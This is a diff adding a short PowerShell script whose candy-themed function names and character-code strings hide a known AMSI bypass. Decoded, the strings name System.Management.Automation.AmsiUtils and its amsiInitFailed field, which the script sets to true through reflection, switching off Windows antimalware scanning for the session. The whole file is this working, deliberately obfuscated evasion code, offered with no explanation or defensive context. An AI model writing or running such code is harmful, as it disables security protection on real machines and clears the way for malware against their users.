@@ -1,0 +1,20 @@
+Function setCandyVar {
+    param($sweet, $flavor)
+    $a1 = [AppDomain]::CurrentDomain.GetAssemblies()
+    $a2 = $a1 | Where-Object { $_.FullName -like "*"+([char]83)+([char]121)+([char]115)+([char]116)+([char]101)+([char]109)+"."+([char]77)+([char]97)+([char]110)+([char]97)+([char]103)+([char]101)+([char]109)+([char]101)+([char]110)+([char]116)+"."+([char]65)+([char]117)+([char]116)+([char]111)+([char]109)+([char]97)+([char]116)+([char]105)+([char]111)+([char]110)+"*" }
+    Set-Variable -Scope Script -Name $sweet -Value $a2
+}
+
+Function getCandyType { param($sweet) Get-Variable -Name $sweet -Scope Script -ValueOnly }
+Function unwrapCandy { param($o, $n) $o.GetType($n, $false, $false) }
+Function findWrapper { param($t, $f, $flags) $t.GetField($f, $flags) }
+Function fillWrapper { param($field, $value) $field.SetValue($null, $value) }
+
+$candyName = "Snickers123"
+setCandyVar $candyName
+$bag = getCandyType $candyName
+$n = ([char]83)+([char]121)+([char]115)+([char]116)+([char]101)+([char]109)+'.'+([char]77)+([char]97)+([char]110)+([char]97)+([char]103)+([char]101)+([char]109)+([char]101)+([char]110)+([char]116)+'.'+([char]65)+([char]117)+([char]116)+([char]111)+([char]109)+([char]97)+([char]116)+([char]105)+([char]111)+([char]110)+'.'+([char]65)+([char]109)+([char]115)+([char]105)+([char]85)+([char]116)+([char]105)+([char]108)+([char]115)
+$type = unwrapCandy $bag $n
+$f = ([char]97)+([char]109)+([char]115)+([char]105)+([char]73)+([char]110)+([char]105)+([char]116)+([char]70)+([char]97)+([char]105)+([char]108)+([char]101)+([char]100)
+$field = findWrapper $type $f ([Reflection.BindingFlags] "NonPublic,Static")
+fillWrapper $field $true
